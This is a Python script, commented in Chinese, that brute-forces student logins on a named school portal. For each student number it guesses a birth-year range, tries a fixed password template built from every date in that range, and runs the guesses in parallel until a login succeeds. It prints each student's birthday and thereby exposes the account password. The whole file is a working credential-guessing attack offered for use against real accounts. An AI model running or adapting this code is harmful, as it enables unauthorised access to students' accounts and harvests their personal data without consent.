import requests
import datetime
import logging
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from typing import List, Optional

# 配置常量
LOGIN_URL = "http://portal.kcisec.com/login/Account/LogInCheck"
PASSWORD_TEMPLATE = "Kskq%{}"
SEARCH_ORDER = [7, 8, 6, 9]
DEFAULT_INPUT_FILE = "login.txt"
MAX_WORKERS = 3
TIMEOUT = 10
RETRIES = 3

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)

class BirthdayFinder:
    def __init__(self):
        self.results = []
    
    def login(self, username: str, password: str, session: requests.Session) -> bool:
        """执行登录验证"""
        params = {
            "UserId": username,
            "Password": password,
            "Mode": "tuberculosis",
        }
        try:
            response = session.get(LOGIN_URL, params=params, timeout=TIMEOUT)
            return any(key in response.text for key in ("login_ok", "Account/ShowPage"))
        except requests.exceptions.RequestException as e:
            logging.error(f"登录失败 [{username}]: {str(e)}")
            return False

    def validate_student_number(self, username: str) -> bool:
        """验证学号有效性"""
        if len(username) < 2:
            logging.warning(f"无效学号 [{username}]: 长度不足两位")
            return False
        try:
            int(username[:2])
            return True
        except ValueError:
            logging.warning(f"无效学号 [{username}]: 前两位非数字")
            return False

    def generate_dates(self, start_year: int):
        """生成日期范围迭代器"""
        start_date = datetime.datetime(start_year, 9, 1)
        end_date = datetime.datetime(start_year + 1, 9, 1)
        current_date = start_date
        while current_date < end_date:
            yield current_date
            current_date += datetime.timedelta(days=1)

    def find_birthday(self, username: str) -> str:
        """主查询函数"""
        if not self.validate_student_number(username):
            return "无效学号"

        prefix = int(username[:2])
        session = requests.Session()
        session.mount("http://", HTTPAdapter(max_retries=RETRIES))
        session.mount("https://", HTTPAdapter(max_retries=RETRIES))

        for grade_offset in SEARCH_ORDER:
            base_year = prefix - grade_offset + 2000
            logging.info(f"尝试 [{username}] 年级偏移: {grade_offset} (基年: {base_year})")
            
            for current_date in self.generate_dates(base_year):
                password = PASSWORD_TEMPLATE.format(current_date.strftime("%Y%m%d"))
                if self.login(username, password, session):
                    logging.info(f"成功匹配 [{username}]: {current_date.strftime('%Y%m%d')}")
                    return current_date.strftime("%Y%m%d")
        
        return "未找到生日"

    def process_students(self, student_numbers: List[str]):
        """处理学号列表并保持顺序"""
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            self.results = list(executor.map(self.find_birthday, student_numbers))

def main():
    """主程序"""
    finder = BirthdayFinder()
    
    choice = input("请选择输入方式：\n1. 手动输入\n2. 文件输入\n请输入选项：").strip()
    
    if choice == "1":
        if sn := input("请输入学号：").strip():
            student_numbers = [sn]
        else:
            print("输入无效")
            return
    elif choice == "2":
        file_path = input(f"输入文件路径（默认{DEFAULT_INPUT_FILE}）：").strip() or DEFAULT_INPUT_FILE
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                student_numbers = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logging.error(f"文件未找到: {file_path}")
            return
    else:
        print("无效选项")
        return

    if not student_numbers:
        print("无有效学号")
        return

    finder.process_students(student_numbers)
    
    # 直接输出换行分割的结果
    print("\n查询结果：")
    print("\n".join(finder.results))

if __name__ == "__main__":
    main()